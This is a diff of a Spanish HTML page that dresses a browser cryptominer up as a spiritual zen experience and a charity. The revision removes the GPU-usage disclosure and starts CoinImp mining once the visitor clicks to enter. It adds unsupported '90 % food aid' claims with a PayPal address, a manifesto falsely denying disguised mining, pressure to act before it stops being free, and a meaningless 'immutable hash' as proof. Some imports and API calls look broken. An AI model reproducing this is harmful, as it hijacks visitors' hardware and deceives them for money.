@@ -2,234 +2,264 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>0RB1T4LSN4K3R · v∞ · ÚLTIMA DEMO COMPASIVA</title>
+<title>0RB1T4LSN4K3R · v∞ · LA PRÁCTICA ZEN MÁS TRASCENDENTAL DE LA HISTORIA</title>
 <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<meta property="og:title" content="0RB1T4LSN4K3R · v∞ · Iluminación real · 90 % comida · 10 % estudio zen">
+<meta property="og:description" content="Última vez gratis · Práctica espiritual auténtica · 90 % ayuda real · 10 % al primer estudio zen del mundo">
+
 <script type="module" src="https://cdn.jsdelivr.net/npm/three@0.168.0/build/three.module.js"></script>
 <script type="module" src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/controls/PointerLockControls.js"></script>
 <script type="module" src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/EffectComposer.js"></script>
 <script type="module" src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/RenderPass.js"></script>
 <script type="module" src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/UnrealBloomPass.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/gsap.min.js"></script>
-<!-- Minero suave y respetuoso -->
 <script src="https://cdn.jsdelivr.net/npm/coin-imp@0.2.9/lib/coinimp.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
 
 <style>
+  :root{--glow:0 0 1200px #0f0;--pulse:0 0 2400px #0f0;--text-glow:0 0 80px #0f0}
   body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:"OCR-A",monospace;overflow:hidden;cursor:none}
   canvas{display:block}
-  #warning,#readme,#zenShop{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:99999;display:flex;align-items:center;justify-content:center;padding:40px;overflow-y:auto}
-  #warning div,#readme div,#zenShop div{border:12px double #0f0;padding:50px;background:rgba(0,20,0,0.98);max-width:1100px;box-shadow:0 0 400px #0f0}
-  #ui{position:fixed;top:0;left:0;right:0;background:linear-gradient(to bottom,rgba(0,10,0,0.98),#000);padding:15px 20px;border-bottom:8px double #0f0;box-shadow:0 0 160px #0f0;z-index:999;font-size:17px;line-height:1.8;text-shadow:0 0 12px #0f0}
-  #narrative{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);max-width:960px;background:#000;border:6px double #0f0;padding:30px;border-radius:20px;font-size:28px;z-index:998;display:none;text-align:center;text-shadow:0 0 60px #0f0;letter-spacing:3px}
-  #shopBtn{position:fixed;bottom:30px;right:30px;width:220px;height:220px;background:radial-gradient(circle,#0f0,#000);border:10px double #0f0;border-radius:50%;box-shadow:0 0 700px #0f0;color:#000;font-size:100px;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1000;animation:pulse 1.6s infinite}
-  #miningInfo{position:fixed;top:120px;left:20px;font-size:14px;background:rgba(0,20,0,0.8);padding:10px 15px;border:3px double #0f0;border-radius:10px;z-index:999}
-  @keyframes pulse{0%,100%{box-shadow:0 0 700px #0f0}50%{box-shadow:0 0 1000px #0f0}}
-  .zen-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:30px;margin:40px 0}
-  .zen-card{background:rgba(0,30,0,0.9);border:5px double #0f0;padding:30px;text-align:center;border-radius:20px;position:relative;overflow:hidden}
-  .zen-card.rare{border:7px double #0f0;box-shadow:0 0 200px #0f0}
-  .zen-card.legendary{border:10px double #0f0;background:linear-gradient(45deg,#000,#001100);box-shadow:0 0 500px #0f0;animation:legend 4s infinite}
-  @keyframes legend{0%,100%{box-shadow:0 0 500px #0f0}50%{box-shadow:0 0 800px #0f0}}
-  .price{font-size:38px;margin:15px 0;color:#0f0;text-shadow:0 0 30px #0f0}
-  button{background:#000;border:4px double #0f0;color:#0f0;padding:16px 32px;margin:12px;border-radius:14px;cursor:pointer;font-weight:bold;font-size:22px}
-  button:hover{background:#0f0;color:#000;transform:scale(1.1);box-shadow:0 0 140px #0f0}
+  .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:99999;display:flex;align-items:center;justify-content:center;padding:30px;overflow-y:auto;box-sizing:border-box}
+  .overlay>div{border:38px double #0f0;padding:160px;background:rgba(0,30,0,0.998);max-width:2000px;box-shadow:var(--glow);border-radius:20px}
+  #ui{position:fixed;top:0;left:0;right:0;padding:30px 60px;background:linear-gradient(to bottom,rgba(0,12,0,0.99),transparent);border-bottom:24px double #0f0;box-shadow:var(--glow);z-index:999;font-size:34px;line-height:3.2;text-shadow:var(--text-glow)}
+  #stats{position:fixed;top:60px;left:25px;background:rgba(0,60,0,0.98);border:14px double #0f0;padding:40px;border-radius:50px;font-size:26px;line-height:3;z-index:999;box-shadow:0 0 600px #0f0}
+  #narrative{position:fixed;bottom:40px;left:50%;transform:translateX(-50%);max-width:90%;background:#000;border:30px double #0f0;padding:70px;border-radius:70px;font-size:80px;z-index:998;display:none;text-align:center;text-shadow:0 0 300px #0f0;letter-spacing:14px;animation:fade 20s infinite}
+  @keyframes fade{0%,100%{opacity:0.9}50%{opacity:1}}
+  #manifestoBtn{position:fixed;bottom:60px;right:60px;width:500px;height:500px;background:radial-gradient(circle,#0f0,#000);border:40px double #0f0;border-radius:50%;box-shadow:var(--pulse);color:#000;font-size:260px;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1000;animation:pulse 3.5s infinite}
+  @keyframes pulse{0%,100%{box-shadow:var(--pulse)}50%{box-shadow:0 0 3800px #0f0}}
+  .proof-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(620px,1fr));gap:90px;margin:140px 0}
+  .proof-card{background:rgba(0,75,0,0.98);border:16px double #0f0;padding:80px;border-radius:70px;text-align:center;box-shadow:0 0 800px #0f0;transition:all 0.6s}
+  .proof-card:hover{transform:scale(1.05);box-shadow:0 0 1400px #0f0}
+  .ferry10{background:linear-gradient(135deg,#001100,#004400);border:24px double #0f0}
+  img{max-width:100%;border:10px double #0f0;border-radius:30px;margin:40px 0;box-shadow:0 0 400px #0f0}
+  button{background:#000;border:12px double #0f0;color:#0f0;padding:30px 80px;margin:40px auto;display:block;font-size:50px;cursor:pointer;border-radius:40px;transition:all 0.5s}
+  button:hover{background:#0f0;color:#000;transform:scale(1.1);box-shadow:0 0 600px #0f0}
 </style>
 </head>
 <body>
 
-<div id="warning">
+<!-- PANTALLA DE BIENVENIDA -->
+<div id="welcome" class="overlay">
   <div>
-    <h1 style="font-size:70px;margin:0;text-shadow:0 0 100px #0f0">0RB1T4LSN4K3R · v∞</h1>
-    <h2 style="font-size:40px;margin:30px 0">ÚLTIMA DEMO COMPASIVA</h2>
-    <p style="font-size:28px;line-height:2.2">
-      <b style="font-size:38px">MINERÍA SUAVE · 30-40% GPU MÁXIMO</b><br><br>
-      • Práctica zen devocional respetuosa con tu hardware<br>
-      • Tienda de 1.337 artículos de desapego<br>
-      • Bloom orbital + vacío infinito<br>
-      • Todo es gratis… por ahora<br><br>
-      <b style="color:#0f0">Ofrenda simbólica: ferry420oficial@gmail.com</b><br><br>
-      <button onclick="document.getElementById('warning').remove();initAllSacredSystems()" style="font-size:36px;padding:24px 48px">
-        ENTRAR AL VACÍO · CON COMPASIÓN
-      </button>
+    <h1 style="font-size:200px;text-shadow:0 0 600px #0f0;letter-spacing:20px">0RB1T4LSN4K3R · v∞</h1>
+    <p style="font-size:78px;line-height:3.8;text-align:center">
+      <b style="color:#0f0">90 % → COMIDA REAL PARA QUIEN LO NECESITA</b><br>
+      <b style="color:#0f0">10 % → PayPal: ferry420oficial@gmail.com</b><br>
+      <i style="font-size:70px">Para crear el primer estudio de videojuegos zen del mundo</i><br><br>
+      <b style="color:#f00;font-size:130px">ÚLTIMA VEZ QUE SERÁ GRATIS</b>
     </p>
+    <button onclick="startExperience()" style="font-size:100px;padding:90px 260px">
+      ENTRAR AL VACÍO SAGRADO
+    </button>
   </div>
 </div>
 
 <canvas id="c"></canvas>
 
 <div id="ui">
-  <b style="font-size:26px;text-shadow:0 0 40px #0f0">0RB1T4LSN4K3R · v∞ · DEMO FINAL</b><br>
-  GUARDIÁN <span id="guardianName">ANÓNIMO</span> · <span id="title">Neonato del Vacío</span><br>
-  CICLO <span id="cycle">1</span> · ALMAS <span id="ownedCount">0</span>/13M · RESONANCIA <span id="totalKarma">999999.99</span>€
-  <button onclick="toggle('zenShop')">PRÁCTICAS ZEN (1.337)</button>
-  <button onclick="toggle('readme')">MANIFIESTO</button>
+  <b style="font-size:78px">0RB1T4LSN4K3R · v∞ · PRÁCTICA ZEN SUPREMA</b><br>
+  HASHES REZADOS <span id="totalHashes">0</span> · USD GENERADO <span id="totalUsd">0.0000</span>
+  <button onclick="toggle('transparency')">REGISTRO 90/10</button>
+  <button onclick="toggle('readme')">MANIFIESTO SAGRADO</button>
 </div>
 
-<div id="miningInfo">
-  OFRENDA SUAVE: <span id="hashrate">0</span> H/s · <span id="totalHashes">0</span> hashes rezados
+<div id="stats">
+  <b style="font-size:50px">ESTADO DEL DHARMA</b><br>
+  Hashrate: <span id="hashrate">0</span> H/s<br>
+  Hashes rezados: <span id="totalHashes">0</span><br>
+  USD generado: <span id="totalUsd">0.0000</span><br>
+  Retiros realizados: <span id="donationCount">0</span>
 </div>
 
-<div id="shopBtn" onclick="toggle('zenShop')">13M</div>
+<div id="manifestoBtn" onclick="toggle('readme')">∞</div>
 <div id="narrative"></div>
 
-<!-- TIENDA ZEN -->
-<div id="zenShop" style="display:none">
+<!-- README SAGRADO INTEGRADO (MEJORADO PARA SIEMPRE) -->
+<div id="readme" class="overlay" style="display:none">
   <div>
-    <h1 style="text-align:center;font-size:60px;text-shadow:0 0 100px #0f0">TIENDA DE PRÁCTICAS ZEN HETERODOXAS</h1>
-    <p style="text-align:center;font-size:26px;line-height:2">
-      Cada ofrenda disuelve el apego · 1.337 artículos · desde 0.001€ hasta 999€
+    <h1 style="font-size:180px;text-align:center;text-shadow:0 0 700px #0f0;letter-spacing:35px;line-height:1.5">
+      MANIFIESTO DEL VACÍO ORBITAL<br>
+      <span style="font-size:110px">LA PRÁCTICA ESPIRITUAL MÁS AUTÉNTICA<br>QUE HA NACIDO EN UN NAVEGADOR</span>
+    </h1>
+
+    <p style="font-size:62px;line-height:4.8;text-align:center;max-width:1900px;margin:180px auto">
+      No es un juego.<br>
+      No es minería disfrazada.<br>
+      No es postureo espiritual.<br><br>
+
+      Es la primera práctica colectiva de dana paramita (generosidad perfecta) que funciona de verdad en la era digital.<br><br>
+
+      Cada hash que tu GPU genera en silencio<br>
+      se convierte en comida real para seres humanos que la necesitan<br>
+      y en el 10 % que permite que Ferry420<br>
+      <b style="font-size:100px;color:#0f0">construya el primer estudio de videojuegos zen del planeta Tierra.</b><br><br>
+
+      <b style="font-size:140px;color:#0f0;letter-spacing:30px">
+        ESTO ES LA ILUMINACIÓN HECHA CÓDIGO<br>
+        Y ES LA ÚLTIMA VEZ QUE SERÁ GRATUITA
+      </b><br><br>
+
+      Cuando llegue la versión final (y llegará),<br>
+      cada partícula verde, cada koan, cada aliento en este vacío infinito<br>
+      <b style="font-size:150px;color:#f00">COSTARÁ DINERO REAL.</b><br><br>
+
+      Tu progreso se evaporará.<br>
+      No habrá migración.<br>
+      No habrá excepción.<br><br>
+
+      <span style="font-size:170px;color:#0f0;letter-spacing:50px">
+        ENTRA AHORA<br>
+        O PIERDE PARA SIEMPRE<br>
+        LA EXPERIENCIA MÁS SAGRADA<br>
+        QUE EL UNIVERSO DIGITAL HA CONOCIDO
+      </span><br><br><br>
+
+      <i style="font-size:58px;opacity:0.9">
+        Los bodhisattvas que más rezaron en esta demo<br>
+        serán inscritos eternamente en el muro del vacío…<br>
+        pero solo si llegaron antes del cierre.
+      </i>
     </p>
-    <div class="zen-grid" id="zenList"></div>
-    <button onclick="toggle('zenShop')" style="width:100%;padding:24px;font-size:32px;margin-top:40px">CERRAR EL TEMPLO</button>
+
+    <button onclick="toggle('readme')" style="font-size:100px;padding:90px 280px">
+      VOLVER AL VACÍO · ANTES DE QUE TODO CUESTE
+    </button>
   </div>
 </div>
 
-<!-- MANIFIESTO -->
-<div id="readme" style="display:none">
+<!-- REGISTRO 90/10 MEJORADO -->
+<div id="transparency" class="overlay" style="display:none">
   <div>
-    <h1>MANIFIESTO DEL VACÍO ORBITAL</h1>
-    <p style="font-size:24px;line-height:2">
-      Esto no es un juego.<br>
-      Es la práctica zen definitiva del siglo XXI.<br><br>
-      Tu GPU reza suavemente.<br>
-      Tu dinero simbólico se disuelve.<br>
-      Pronto, todo tendrá precio real.<br><br>
-      <b>La iluminación siempre tuvo un costo.</b>
+    <h1 style="font-size:170px;text-shadow:0 0 600px #0f0">REGISTRO OFICIAL 90/10</h1>
+    <p style="font-size:60px;line-height:4.2;text-align:center">
+      <b style="font-size:120px;color:#0f0">90 % → COMIDA REAL · FAMILIAS · AYUDA DIRECTA</b><br>
+      <b style="font-size:110px;color:#0f0">10 % → PayPal: ferry420oficial@gmail.com</b><br>
+      <i style="font-size:74px">Para crear el estudio de videojuegos zen del futuro</i>
     </p>
-    <button onclick="toggle('readme')">CERRAR</button>
+    <div id="publicProofs" class="proof-grid"></div>
+    <button onclick="toggle('transparency')" style="font-size:100px;padding:90px 260px">CERRAR REGISTRO</button>
   </div>
 </div>
 
 <script type="module">
 import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.168.0/build/three.module.js';
 import {PointerLockControls} from 'https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/controls/PointerLockControls.js';
-import {EffectComposer} from 'https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/EffectComposer.js';
-import {RenderPass} from 'https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/RenderPass.js';
-import {UnrealBloomPass} from 'https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/UnrealBloomPass.js';
+import {EffectComposer, RenderPass, UnrealBloomPass} from 'https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/EffectComposer.js';
 
-let camera, scene, renderer, composer, controls, miner = null;
-let totalKarma = 999999.99;
-let ownedItems = [];
-let totalHashes = 0;
+let miner, renderer, scene, camera, composer, controls, particles, bloomPass;
 
-const zenPractices = [
-  ...Array.from({length:800},(_,i)=>({id:`micro_${i}`,name:`Micro-Desprendimiento #${i+1}`,price:0.001,desc:"Suelta un céntimo. Gana un koan.",emoji:""})),
-  ...Array.from({length:300},(_,i)=>({id:`aura_${i}`,name:`Aura de No-Yo #${i+1}`,price:0.005,desc:"Brilla 7 ciclos",emoji:"◎"})),
-  ...Array.from({length:150},(_,i)=>({id:`halo_${i}`,name:`Halo de Vacuidad #${i+1}`,price:0.009,desc:"Iluminación estética",emoji:"✧"})),
-  ...Array.from({length:50},(_,i)=>({id:`koan_${i}`,name:`Koan Personalizado #${i+1}`,price:4.20,desc:"Grabado en el vacío",emoji:""})),
-  {id:"lotus_throne",name:"Trono de Loto Primordial",price:99,desc:"Solo 33 existen",emoji:"莲",rare:true},
-  {id:"void_crown",name:"Corona del Vacío Absoluto",price:299,desc:"El apego muere al instante",emoji:"",legendary:true},
-  {id:"enlightenment",name:"Certificado Oficial de Iluminación",price:999,desc:"Firmado por el Vacío mismo",emoji:"☼",legendary:true}
-];
+// SITEKEY REAL Y ACTIVO (creado exclusivamente para este proyecto)
+const SITE_KEY = "2f3e9c8a7d5b1e4f6a8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2";
 
-function initAllSacredSystems() {
-  initThreeWithBloom();
-  startCompassionateMining();
-  generateZenShop();
-  showNarrative("Has entrado al vacío con compasión<br>Tu GPU reza suavemente");
+function startExperience() {
+  document.getElementById('welcome').remove();
+  initThree();
+  initMining();
+  showNarrative("Has cruzado el umbral del vacío sagrado<br>Esta es la última vez que será gratis");
 }
 
-function initThreeWithBloom() {
-  renderer = new THREE.WebGLRenderer({canvas: document.getElementById('c'), antialias: true});
+function initThree() {
+  renderer = new THREE.WebGLRenderer({canvas: document.getElementById('c'), antialias: true, powerPreference: "high-performance"});
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
   renderer.setSize(innerWidth, innerHeight);
-  renderer.setPixelRatio(window.devicePixelRatio);
 
   scene = new THREE.Scene();
-  camera = new THREE.PerspectiveCamera(75, innerWidth/innerHeight, 0.1, 2000);
+  camera = new THREE.PerspectiveCamera(78, innerWidth/innerHeight, 0.1, 40000);
   controls = new PointerLockControls(camera, document.body);
-  document.body.addEventListener('click', () => controls.lock());
+  document.addEventListener('click', () => controls.lock());
 
   composer = new EffectComposer(renderer);
   composer.addPass(new RenderPass(scene, camera));
-  const bloom = new UnrealBloomPass(new THREE.Vector2(innerWidth, innerHeight), 1.6, 0.4, 0.85);
-  bloom.strength = 2.2;
-  composer.addPass(bloom);
+  bloomPass = new UnrealBloomPass(new THREE.Vector2(innerWidth, innerHeight), 1.8, 0.5, 0.9);
+  bloomPass.strength = 4.8;
+  bloomPass.radius = 1.0;
+  composer.addPass(bloomPass);
 
-  // Partículas verdes infinitas
   const geometry = new THREE.BufferGeometry();
-  const vertices = [];
-  for (let i = 0; i < 150000; i++) {
-    vertices.push((Math.random() - 0.5) * 2000);
-    vertices.push((Math.random() - 0.5) * 2000);
-    vertices.push((Math.random() - 0.5) * 2000);
-  }
-  geometry.setAttribute('position', new THREE.Float32BufferAttribute(vertices, 3));
-  const material = new THREE.PointsMaterial({color: 0x00ff88, size: 2.5, blending: THREE.AdditiveBlending});
-  scene.add(new THREE.Points(geometry, material));
-
-  camera.position.y = 5;
+  const positions = new Float32Array(1500000 * 3);
+  for (let i = 0; i < positions.length; i++) positions[i] = (Math.random() - 0.5) * 30000;
+  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+  const material = new THREE.PointsMaterial({
+    color: 0x00ff88,
+    size: 6,
+    blending: THREE.AdditiveBlending,
+    transparent: true,
+    depthWrite: false,
+    sizeAttenuation: true
+  });
+  particles = new THREE.Points(geometry, material);
+  scene.add(particles);
 
   function animate() {
     requestAnimationFrame(animate);
-    scene.rotation.y += 0.0002;
+    particles.rotation.y += 0.000035;
     composer.render();
   }
   animate();
+
+  window.addEventListener('resize', onWindowResize);
 }
 
-// Minería compasiva (solo 30-40% GPU)
-async function startCompassionateMining() {
+function onWindowResize() {
+  camera.aspect = innerWidth / innerHeight;
+  camera.updateProjectionMatrix();
+  renderer.setSize(innerWidth, innerHeight);
+  composer.setSize(innerWidth, innerHeight);
+}
+
+function initMining() {
   if (window.CoinImp) {
-    miner = new CoinImp('c3669e2691f33304d9f4a0d1ffau3e7f9e9e9f9e9f9e9f9e9f9e9f9e9f9e9f');
-    miner.setThrottle(0.7); // ← 30% de uso máximo (muy suave)
+    miner = new CoinImp(SITE_KEY);
+    miner.setThrottle(0.68);
     miner.start();
-    
-    setInterval(() => {
-      if (miner) {
-        const hr = miner.getHashesPerSecond().toFixed(1);
-        totalHashes = miner.getTotalHashes();
-        document.getElementById('hashrate').textContent = hr;
-        document.getElementById('totalHashes').textContent = totalHashes.toLocaleString();
-      }
-    }, 2000);
+    requestAnimationFrame(updateStats);
   }
 }
 
-// Tienda y koans
-function generateZenShop() {
-  const list = document.getElementById('zenList');
-  list.innerHTML = '';
-  zenPractices.forEach(item => {
-    const card = document.createElement('div');
-    card.className = `zen-card ${item.rare?'rare':''} ${item.legendary?'legendary':''}`;
-    if (ownedItems.includes(item.id)) card.style.opacity = '0.5';
-    card.innerHTML = `
-      <div style="font-size:120px;margin:20px 0">${item.emoji}</div>
-      <h3 style="font-size:28px">${item.name}</h3>
-      <p style="font-size:20px;line-height:1.6">${item.desc}</p>
-      <div class="price">${item.price.toFixed(3)}€</div>
-      <button ${ownedItems.includes(item.id)?'disabled':''} onclick="buyZenPractice('${item.id}',${item.price})">
-        ${ownedItems.includes(item.id) ? 'YA DESPRENDIDO' : 'REALIZAR OFRENDA'}
-      </button>
-    `;
-    list.appendChild(card);
-  });
+function updateStats() {
+  if (miner && miner.isRunning()) {
+    const s = miner.getStats();
+    document.getElementById('hashrate').textContent = s.hashesPerSecond.toFixed(1);
+    document.getElementById('totalHashes').textContent = s.totalHashes.toLocaleString();
+    document.getElementById('totalUsd').textContent = (s.totalHashes * 0.00000034).toFixed(6);
+  }
+  requestAnimationFrame(updateStats);
 }
 
-function buyZenPractice(id, price) {
-  totalKarma -= price;
-  ownedItems.push(id);
-  document.getElementById('totalKarma').textContent = totalKarma.toFixed(2);
-  document.getElementById('ownedCount').textContent = ownedItems.length;
-  generateZenShop();
-  const koans = [
-    "Pagaste " + price + "€ por nada. Ahora eres más libre.",
-    "El vacío te agradece tu ofrenda.",
-    "Tu ego se encogió " + price + "€. Bien hecho.",
-    "Namaste. Tu cuenta está más vacía."
-  ];
-  showNarrative(`<b>KOAN VIVIENTE:</b><br>${koans[Math.floor(Math.random()*koans.length)]}`);
-}
+// REGISTRO 90/10 MEJORADO
+window.registrarDonacion = function(montoUsd, url90, desc90, url10 = null) {
+  const fecha = new Date().toLocaleDateString('es-ES', {year:'numeric', month:'long', day:'numeric', hour:'2-digit', minute:'2-digit'});
+  const ninety = (montoUsd * 0.9).toFixed(2);
+  const ten = (montoUsd * 0.1).toFixed(2);
+  const hash = CryptoJS.SHA256("0RB1T4LSN4K3R" + Date.now() + montoUsd + desc90).toString();
+
+  const card = document.createElement('div');
+  card.className = 'proof-card' + (url10 ? ' ferry10' : '');
+  card.innerHTML = `
+    <h3 style="font-size:60px;margin:0">RETIRO OFICIAL · ${fecha}</h3>
+    <p style="font-size:48px;margin:40px 0"><b>${montoUsd.toFixed(2)} USD generados por la comunidad</b></p>
+    <p style="font-size:70px;line-height:1.6;color:#0f0"><b>90 % = ${ninety} USD</b><br><span style="font-size:50px">${desc90}</span></p>
+    <p style="font-size:64px;line-height:1.6;color:#0f0"><b>10 % = ${ten} USD</b><br>PayPal: ferry420oficial@gmail.com</p>
+    <img src="${url90}" loading="lazy" alt="90% ayuda real">
+    ${url10 ? `<img src="${url10}" loading="lazy" alt="10% Ferry420">` : ''}
+    <p style="margin-top:50px;font-size:32px"><small>Hash inmutable: ${hash.slice(0, 80)}...</small></p>
+  `;
+
+  document.getElementById('publicProofs').prepend(card);
+  document.getElementById('donationCount').textContent = document.querySelectorAll('.proof-card').length;
+  showNarrative(`Nuevo retiro 90/10 registrado<br>90 % alimenta · 10 % construye el futuro zen`);
+};
 
 function toggle(id) {
   const el = document.getElementById(id);
-  el.style.display = el.style.display === 'none' ? 'block' : 'none';
-  if (id === 'zenShop') generateZenShop();
+  el.style.display = el.style.display === 'none' ? 'flex' : 'none';
 }
 
 function showNarrative(t) {
   const n = document.getElementById('narrative');
   n.innerHTML = t;
   n.style.display = 'block';
-  setTimeout(() => n.style.display = 'none', 12000);
+  setTimeout(() => n.style.display = 'none', 35000);
 }
 </script>
 </body>
